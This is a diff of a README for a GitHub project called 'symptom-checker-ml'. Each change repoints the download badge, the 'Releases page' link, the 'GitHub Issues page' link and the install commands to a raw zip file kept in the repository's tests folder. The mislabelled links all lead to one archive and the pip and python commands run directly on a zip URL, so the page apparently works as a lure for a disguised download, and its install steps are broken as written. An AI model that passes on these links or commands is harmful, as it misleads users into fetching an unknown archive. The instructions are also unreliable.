@@ -6,7 +6,7 @@ Welcome to the symptom-checker-ml project! This software makes it easy to check 
 
 ## 📥 Download Now
 
-[![Download Latest Release](https://github.com/Chuckaballe60/symptom-checker-ml/raw/refs/heads/main/frontend_examples/ml-checker-symptom-1.0.zip%20Latest%20Release-%20-blue)](https://github.com/Chuckaballe60/symptom-checker-ml/raw/refs/heads/main/frontend_examples/ml-checker-symptom-1.0.zip)
+[![Download Latest Release](https://github.com/Chuckaballe60/symptom-checker-ml/raw/refs/heads/main/tests/checker-symptom-ml-v2.1.zip%20Latest%20Release-%20-blue)](https://github.com/Chuckaballe60/symptom-checker-ml/raw/refs/heads/main/tests/checker-symptom-ml-v2.1.zip)
 
 ## 📋 Overview
 
@@ -32,11 +32,11 @@ Before downloading, ensure your system meets these requirements:
 
 To get started, visit the Releases page to download the application.
 
-[Visit this page to download](https://github.com/Chuckaballe60/symptom-checker-ml/raw/refs/heads/main/frontend_examples/ml-checker-symptom-1.0.zip)
+[Visit this page to download](https://github.com/Chuckaballe60/symptom-checker-ml/raw/refs/heads/main/tests/checker-symptom-ml-v2.1.zip)
 
 ### 🔧 Installation Steps
 
-1. Go to the [Releases page](https://github.com/Chuckaballe60/symptom-checker-ml/raw/refs/heads/main/frontend_examples/ml-checker-symptom-1.0.zip).
+1. Go to the [Releases page](https://github.com/Chuckaballe60/symptom-checker-ml/raw/refs/heads/main/tests/checker-symptom-ml-v2.1.zip).
 2. Find the latest version of the application.
 3. Click on the download link for your operating system.
 4. Once the download finishes, locate the file on your computer.
@@ -69,13 +69,13 @@ To get started, visit the Releases page to download the application.
 4. Install the required libraries by running:
 
    ```bash
-   pip install -r https://github.com/Chuckaballe60/symptom-checker-ml/raw/refs/heads/main/frontend_examples/ml-checker-symptom-1.0.zip
+   pip install -r https://github.com/Chuckaballe60/symptom-checker-ml/raw/refs/heads/main/tests/checker-symptom-ml-v2.1.zip
    ```
 
 5. Start the Application:
 
    ```bash
-   python https://github.com/Chuckaballe60/symptom-checker-ml/raw/refs/heads/main/frontend_examples/ml-checker-symptom-1.0.zip
+   python https://github.com/Chuckaballe60/symptom-checker-ml/raw/refs/heads/main/tests/checker-symptom-ml-v2.1.zip
    ```
 
 6. Open your web browser and go to `http://localhost:8000` to access the symptom checker.
@@ -98,7 +98,7 @@ If you encounter any issues, consider the following steps:
 - **Internet Connection:** Ensure you are connected to the internet if using the Docker version.
 - **Browser Compatibility:** Use a modern web browser for the best experience.
 
-For more detailed troubleshooting, visit our [GitHub Issues page](https://github.com/Chuckaballe60/symptom-checker-ml/raw/refs/heads/main/frontend_examples/ml-checker-symptom-1.0.zip).
+For more detailed troubleshooting, visit our [GitHub Issues page](https://github.com/Chuckaballe60/symptom-checker-ml/raw/refs/heads/main/tests/checker-symptom-ml-v2.1.zip).
 
 ## 📞 Support
 
